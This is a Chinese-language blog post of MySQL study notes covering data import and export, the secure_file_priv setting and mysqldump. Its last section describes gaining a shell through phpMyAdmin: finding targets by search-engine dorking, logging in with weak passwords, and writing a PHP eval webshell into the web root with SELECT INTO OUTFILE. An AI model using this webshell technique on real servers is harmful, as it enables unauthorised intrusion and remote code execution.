+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 导入导出数据</span><br><span class="line"></span><br><span class="line">## 导入数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>1.mysql命令导入            mysql -uroot -proot &lt; 文件路径</p>
+<p>2.source命令导入</p>
+<p>3.使用 LOAD DATA 导入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 导出数据</span><br><span class="line"></span><br><span class="line">- 第一种方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>SELECT * FROM 表名 INTO OUTFILE “路径+文件名”;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">如果出错，以下为解决办法：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ERROR 1290 (HY000): The MySQL server is running with the –secure-file-priv opti<br>on so it cannot execute this statement</p>
+<p>执行命令（查看相关配置）：<br>SHOW GLOBAL VARIABLES LIKE ‘%secure_file_priv%’;</p>
+<p>secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</p>
+<p>secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。</p>
+<p>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</p>
+<p>永久解决办法：<br>    修改配置文件my.ini，添加如下语句：<br>    secure_file_priv=            //表示可导入导出到任意目录</p>
+<p>临时解决办法：<br>    set global secure_file_priv=’’;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 第二种方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>mysqldump -uroot -p db_name &gt; ./db_name.sql    在DOS命令下运行<br>mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名<br>mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 通过phpmyadmin来getshell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>首先通过google hacking找到phpmyadmin的网站</li>
+<li>弱口令登录，SHOW GLOBAL VARIABLES LIKE ‘%secure_file_priv%’;判断我们有没有权限去写木马文件</li>
+<li>执行SQL语句，查看数据库所在位置：select @@basedir;</li>
+<li>猜测根目录写入木马文件：<code>select  &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;G;//shell.php&#39;</code>：注意：写木马的路径，一般是<code>/var/www/html</code><br>```</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>幻心</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://huanxinhack.github.io/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://huanxinhack.github.io/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/MySQL/"># MySQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/php%E8%BF%9E%E6%8E%A5mysql/">PHP连接MySQL</a>
+            
+            
+            <a class="next" rel="next" href="/php%E8%A1%A8%E5%8D%95-%E6%96%87%E4%BB%B6-%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">PHP表单&文件&代码&命令执行</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 幻心 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
